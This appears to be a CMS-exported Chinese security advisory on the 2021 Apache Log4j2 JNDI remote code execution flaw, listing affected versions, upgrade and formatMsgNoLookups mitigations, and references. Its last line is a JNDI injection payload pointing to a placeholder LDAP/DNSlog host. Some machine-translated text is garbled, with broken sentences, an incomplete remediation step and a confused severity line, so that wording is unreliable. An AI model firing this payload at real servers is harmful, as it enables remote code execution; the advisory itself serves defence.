<?xml version="1.0" encoding="UTF-8"?>
<item><pubDate>Sat, 11 Dec 2021 12:31:46 +0800</pubDate><title><![CDATA[【漏洞预警】Apache Log4j 远程代码执行漏洞]]></title><url><![CDATA[apache-log4j]]></url><meta><![CDATA[]]></meta><metad><![CDATA[]]></metad><menu><![CDATA[【漏洞预警】Apache Log4j 远程代码执行漏洞]]></menu><menuOrder><![CDATA[0]]></menuOrder><menuStatus><![CDATA[]]></menuStatus><template><![CDATA[template.php]]></template><parent><![CDATA[]]></parent><content><![CDATA[&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;01&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;漏洞描述&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;　　Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量的特性。该框架被大量的用于业务业务开发的日志记录日志。经过分析，该组件存在。 Java JNDI 注入漏洞，当将用户输入的数据进行，诊断程序触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;02&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;低于水平&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;严重的&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;03&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;影响范围&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;2.0 &amp;lt;= Apache log4j2 &amp;lt;= 2.15.0-RC1&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;04&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;修复建议&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;1、升级Apache Log4j2所有相关应用到最新版本&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;2、升级已知最新版本的应用及组件到&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;3、暂时关闭&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;log4j2.formatMsgNoLookups=True&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;//&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;参考资料&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;https://github.com/apache/logging-log4j2&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;https://github.com/apache/logging-log4j2/commit/7fe72d6&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;&lt;font style=&quot;vertical-align: inherit;&quot;&gt;${jndi:ldap://xxxxx.dnslog.xx/exp}&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
]]></content><private><![CDATA[]]></private><author><![CDATA[admin]]></author></item>
